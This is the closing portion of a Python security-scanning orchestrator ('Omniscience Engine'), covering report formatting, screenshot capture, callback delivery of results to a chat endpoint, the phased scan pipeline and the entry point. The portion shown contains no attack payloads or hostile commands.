            lines.append(f"### {title} ({len(flist)})\n")
            for f in flist:
                lines.append(f"#### {f.get('description', 'No description')}\n")
                lines.append("| Field | Value |")
                lines.append("|-------|-------|")
                lines.append(f"| **Severity** | {f.get('severity', 'info').upper()} |")
                if f.get('url'):
                    lines.append(f"| **URL** | `{f['url']}` |")
                if f.get('parameter'):
                    lines.append(f"| **Parameter** | `{f['parameter']}` |")
                if f.get('payload'):
                    lines.append(f"| **Payload** | `{f['payload']}` |")
                lines.append("")
            lines.append("")

        lines += ["---", f"*Report generated by Omniscience Engine — {self.timestamp}*"]
        return "\n".join(lines)

    def generate_summary_section(self) -> str:
        categorized, _ = self._categorize_findings()
        sev_icons = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢", "info": "🔵"}
        lines = [f"📋 **Scan Complete: {self.target}**", f"", f"**Total Findings:** {len(self.findings)}", ""]
        for sev in ["critical", "high", "medium", "low", "info"]:
            count = len(categorized[sev])
            if count > 0:
                lines.append(f"{sev_icons[sev]} **{sev.upper()}:** {count}")
        lines.append("")
        all_hi = categorized["critical"] + categorized["high"] + categorized["medium"]
        if all_hi:
            lines.append("**Top Issues:**")
            for f in all_hi[:5]:
                lines.append(f"  • {f.get('description', 'Unknown')[:80]}")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════
# SCREENSHOT CAPTURE
# ═══════════════════════════════════════════════════════════════════════

class ScreenshotCapture:
    def __init__(self):
        self.screenshot_dir = "/tmp/screenshots"
        os.makedirs(self.screenshot_dir, exist_ok=True)

    def capture(self, url: str, full_page: bool = True,
                width: int = 1280, height: int = 720) -> Optional[str]:
        if not PLAYWRIGHT_AVAILABLE:
            logging.warning("Playwright not installed — skipping screenshot")
            return None
        try:
            timestamp  = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_name  = re.sub(r'[^a-zA-Z0-9]', '_', url[:50])
            filename   = f"{self.screenshot_dir}/{safe_name}_{timestamp}.png"

            with sync_playwright() as p:        # FIX: was `playwright.chromium` — should be `p.chromium`
                browser = p.chromium.launch(
                    headless=True,
                    args=[
                        "--no-sandbox", "--disable-setuid-sandbox",
                        "--disable-dev-shm-usage", "--disable-gpu",
                    ]
                )
                context = browser.new_context(
                    viewport={"width": width, "height": height},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    ignore_https_errors=True
                )
                page = context.new_page()
                page.set_default_timeout(30000)
                try:
                    page.goto(url, wait_until="networkidle", timeout=30000)
                    page.wait_for_timeout(2000)
                    page.screenshot(path=filename, full_page=full_page)
                    browser.close()
                    logging.info(f"Screenshot saved: {filename}")
                    return filename
                except Exception as e:
                    logging.warning(f"Screenshot page error for {url}: {e}")
                    try:
                        page.screenshot(path=filename)
                        browser.close()
                        return filename
                    except Exception:
                        browser.close()
                        return None
        except Exception as e:
            logging.error(f"Screenshot system error: {e}")
            return None


# ═══════════════════════════════════════════════════════════════════════
# CALLBACK DELIVERY
# ═══════════════════════════════════════════════════════════════════════

class CallbackDelivery:
    def __init__(self, callback_url: str, chat_id: str):
        self.callback_url = callback_url
        self.chat_id      = chat_id

    def send_status(self, message: str, status_type: str = "status") -> bool:
        try:
            payload = {
                "chat_id": self.chat_id,
                "text": message,
                "type": status_type,
                "source": "engine.py"
            }
            resp = requests.post(self.callback_url, json=payload, timeout=15)
            return resp.status_code == 200
        except Exception as e:
            logging.error(f"Status callback failed: {e}")
            return False

    def send_report(self, markdown_report: str) -> Optional[str]:
        try:
            payload = {
                "chat_id": self.chat_id,
                "report": markdown_report,
                "type": "report",
                "source": "engine.py",
                "filename": f"vapt_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
                "action": "create_doc"
            }
            resp = requests.post(self.callback_url, json=payload, timeout=30)
            data = resp.json() if resp.ok else {}
            return data.get("doc_url") or data.get("url")
        except Exception as e:
            logging.error(f"Report callback failed: {e}")
            return None

    def send_screenshot(self, screenshot_path: str) -> bool:
        try:
            with open(screenshot_path, 'rb') as f:
                files = {'photo': f}
                data  = {
                    "chat_id": self.chat_id, "type": "screenshot",
                    "source": "engine.py",
                    "filename": os.path.basename(screenshot_path)
                }
                resp = requests.post(self.callback_url, data=data, files=files, timeout=60)
                return resp.ok
        except Exception as e:
            logging.error(f"Screenshot callback failed: {e}")
            return False

    def send_log(self, log_data: Dict) -> bool:
        try:
            payload = {
                "chat_id": self.chat_id, "type": "log",
                "source": "engine.py", "log_data": log_data
            }
            resp = requests.post(self.callback_url, json=payload, timeout=15)
            return resp.ok
        except Exception as e:
            logging.error(f"Log callback failed: {e}")
            return False


# ═══════════════════════════════════════════════════════════════════════
# SCAN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════

class ScanOrchestrator:
    """Orchestrate the full scan pipeline end-to-end."""

    def __init__(self, config):
        # FIX: use correct Config attribute names throughout
        self.target       = config.TARGET
        self.callback_url = config.CALLBACK_URL     # alias added to Config
        self.chat_id      = str(config.CHAT_ID)     # alias added to Config
        self.false_positives = list(config.FALSE_POSITIVES)

        # FIX: pass target string, not config object, to engines
        self.recon      = ReconEngine(config.TARGET)
        self.osint      = OSINTEngine(config.TARGET)
        self.web_audit  = WebAuditEngine(config.TARGET)
        # FIX: use GEMINI_API_KEYS list; falls back to single key if list is empty
        api_keys = config.GEMINI_API_KEYS if config.GEMINI_API_KEYS else [config.GEMINI_API_KEY]
        self.ai_analyzer = AIVulnerabilityAnalyzer(api_keys)
        self.callback    = CallbackDelivery(self.callback_url, self.chat_id)
        self.screenshot  = ScreenshotCapture()

        self.all_findings:  List[Dict] = []
        self.scan_start_time: Optional[datetime] = None
        self.scan_end_time:   Optional[datetime] = None

    def run(self) -> Dict:
        self.scan_start_time = datetime.now()
        print(f"\n{'═'*50}")
        print(f"  OMNISCIENCE ENGINE — Target: {self.target}")
        print(f"  Started: {self.scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'═'*50}\n")

        self.callback.send_status(
            f"🔍 *Omniscience Scan Initiated*\n\n"
            f"**Target:** `{self.target}`\n"
            f"**Started:** {self.scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"*Phase 1: Reconnaissance in progress...*"
        )

        # Phase 1: Reconnaissance
        print("[PHASE 1] Reconnaissance")
        recon_results: Dict = {}
        try:
            recon_results = self.recon.run_full_recon()   # FIX: correct method name
            self.all_findings.extend(recon_results.get("findings", []))
            print(f"  ✓ Recon: {len(recon_results.get('subdomains', []))} subdomains found")
            self.callback.send_status(
                f"📡 *Reconnaissance Complete*\n"
                f"**Subdomains:** {len(recon_results.get('subdomains', []))}\n"
                f"*Phase 2: OSINT in progress...*"
            )
        except Exception as e:
            print(f"  ✗ Recon failed: {e}")

        # Phase 2: OSINT
        print("[PHASE 2] OSINT Intelligence Gathering")
        osint_results: Dict = {}
        try:
            osint_results = self.osint.run_full_osint()   # FIX: correct method name
            self.all_findings.extend(osint_results.get("findings", []))
            print(f"  ✓ OSINT: {len(osint_results.get('leaks', []))} leaks, "
                  f"{len(osint_results.get('cloud_assets', []))} cloud assets")
            self.callback.send_status(
                f"🕵️ *OSINT Complete*\n"
                f"**Leaks:** {len(osint_results.get('leaks', []))}\n"
                f"**Cloud Assets:** {len(osint_results.get('cloud_assets', []))}\n"
                f"*Phase 3: Web Audit in progress...*"
            )
        except Exception as e:
            print(f"  ✗ OSINT failed: {e}")

        # Phase 3: Web Vulnerability Audit
        print("[PHASE 3] Web Vulnerability Audit")
        try:
            target_url = f"https://{self.target}" if not self.target.startswith("http") else self.target
            web_findings = self.web_audit.run_all_checks(target_url)
            self.all_findings.extend(web_findings)
            print(f"  ✓ Web audit: {len(web_findings)} vulnerabilities found")
            sev_counts = Counter(f.get("severity", "info") for f in self.all_findings)
            self.callback.send_status(
                f"🌐 *Web Audit Complete*\n"
                f"🔴 Critical: {sev_counts.get('critical',0)}\n"
                f"🟠 High: {sev_counts.get('high',0)}\n"
                f"🟡 Medium: {sev_counts.get('medium',0)}\n"
                f"*Phase 4: AI Analysis in progress...*"
            )
        except Exception as e:
            print(f"  ✗ Web audit failed: {e}")

        # Phase 4: AI Analysis
        print("[PHASE 4] AI-Powered Analysis")
        ai_analysis = None
        if self.all_findings:
            try:
                ai_analysis = self.ai_analyzer.analyze_findings(self.all_findings, self.target)
                if ai_analysis:
                    print(f"  ✓ AI analysis: "
                          f"{len(ai_analysis.get('critical_findings', []))} critical, "
                          f"{len(ai_analysis.get('high_findings', []))} high")
            except Exception as e:
                print(f"  ✗ AI analysis failed: {e}")
        else:
            print("  ! No findings to analyze")

        # Phase 5: Report Generation
        print("[PHASE 5] Report Generation")
        self.scan_end_time = datetime.now()
        duration = (self.scan_end_time - self.scan_start_time).total_seconds()

        reporter = ReportGenerator(self.target, self.all_findings, ai_analysis)
        markdown_report = ""
        try:
            markdown_report = reporter.generate_markdown_report()
            summary         = reporter.generate_summary_section()

            report_filename = f"/tmp/vapt_report_{self.target}_{self.scan_start_time.strftime('%Y%m%d_%H%M%S')}.md"
            with open(report_filename, 'w', encoding='utf-8') as fh:
                fh.write(markdown_report)
            print(f"  ✓ Report saved: {report_filename} ({len(markdown_report):,} chars)")

            doc_url = self.callback.send_report(markdown_report)
            if doc_url:
                print(f"  ✓ Google Doc: {doc_url}")
            else:
                self.callback.send_status(
                    f"📋 *Scan Complete: {self.target}*\n\n{summary}\n\n⏱ {duration:.0f}s"
                )
        except Exception as e:
            print(f"  ✗ Report generation failed: {e}")

        # Phase 6: Screenshots
        print("[PHASE 6] Screenshot Capture")
        try:
            target_url = f"https://{self.target}" if not self.target.startswith("http") else self.target
            ss_path = self.screenshot.capture(target_url)
            if ss_path:
                self.callback.send_screenshot(ss_path)
                print(f"  ✓ Screenshot sent")
        except Exception as e:
            print(f"  ✗ Screenshot failed: {e}")

        # Phase 7: Logging
        print("[PHASE 7] Logging Results")
        try:
            sev_counts = Counter(f.get("severity", "info") for f in self.all_findings)
            log_entry = {
                "timestamp": self.scan_start_time.isoformat(),
                "target": self.target,
                "duration_seconds": int(duration),
                "total_findings": len(self.all_findings),
                "critical": sev_counts.get("critical", 0),
                "high": sev_counts.get("high", 0),
                "medium": sev_counts.get("medium", 0),
                "low": sev_counts.get("low", 0),
                "info": sev_counts.get("info", 0),
                "status": "completed",
            }
            self.callback.send_log(log_entry)
            print(f"  ✓ Results logged")
        except Exception as e:
            print(f"  ✗ Logging failed: {e}")

        print(f"\n{'═'*50}")
        print(f"  SCAN COMPLETE  |  {len(self.all_findings)} findings  |  {duration:.0f}s")
        print(f"{'═'*50}\n")

        return {
            "target": self.target,
            "duration": duration,
            "total_findings": len(self.all_findings),
            "findings": self.all_findings,
            "ai_analysis": ai_analysis,
            "report": markdown_report,
            "timestamp": self.scan_end_time.isoformat()
        }


# ═══════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════

def main():
    print("╔══════════════════════════════════════════╗")
    print("║       OMNISCIENCE ENGINE v6.1 (Fixed)    ║")
    print("╚══════════════════════════════════════════╝\n")

    if not Config.TARGET:
        print("[✗] No target specified. Set TARGET environment variable.")
        sys.exit(1)

    if not Config.GEMINI_API_KEYS:
        print("[✗] No Gemini API keys configured. Set GEMINI_API_KEY or GEMINI_API_KEY_1..6.")
        sys.exit(1)

    print(f"[*] Target:      {Config.TARGET}")
    print(f"[*] Callback:    {Config.CALLBACK_URL}")
    print(f"[*] Chat ID:     {Config.CHAT_ID}")
    print(f"[*] API Keys:    {len(Config.GEMINI_API_KEYS)} configured\n")

    orchestrator = ScanOrchestrator(Config)
    results = orchestrator.run()

    print(f"\n[*] Pipeline complete. Total findings: {results['total_findings']}")
    print(f"[*] Duration: {results['duration']:.0f}s")

    # Write GitHub Actions step summary
    summary_path = os.environ.get("GITHUB_STEP_SUMMARY", "/tmp/scan_summary.md")
    try:
        sev_counts = Counter(f.get("severity", "info") for f in results.get("findings", []))
        with open(summary_path, 'w', encoding='utf-8') as fh:
            fh.write(f"# Scan Results: {Config.TARGET}\n\n")
            fh.write(f"- **Duration:** {results['duration']:.0f}s\n")
            fh.write(f"- **Total Findings:** {results['total_findings']}\n")
            for sev in ["critical", "high", "medium", "low"]:
                if sev_counts.get(sev, 0) > 0:
                    fh.write(f"- **{sev.capitalize()}:** {sev_counts[sev]}\n")
        print(f"[*] Summary written to {summary_path}")
    except Exception:
        pass


if __name__ == "__main__":
    main()
